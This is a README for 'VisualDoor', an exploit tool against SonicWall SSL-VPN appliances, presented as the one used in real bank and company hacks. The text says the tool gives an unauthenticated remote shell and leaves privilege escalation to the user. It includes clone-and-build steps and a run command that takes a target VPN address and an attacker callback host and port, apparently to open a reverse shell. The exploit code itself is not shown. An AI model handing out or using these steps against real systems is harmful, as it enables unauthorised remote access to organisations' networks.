# VisualDoor
SonicWall SSL-VPN Exploit, as used by Phineas Fisher to hack Cayman Trust Bank and Hacking Team.

Unauthenticated, gives you a "nobody" shell. Getting root is an exercise for the user.

For details see: https://darrenmartyn.ie/2021/01/24/visualdoor-sonicwall-ssl-vpn-exploit/

# Docker
```
git clone https://github.com/superzerosec/VisualDoor.git
cd VisualDoor
docker build -t myvisualdoor .
```

# Usage
```
docker run --rm -it -p 443 myvisualdoor python /app/visualdoor.py https://some-vpn.lol:8090 hacke.rs 1337
```
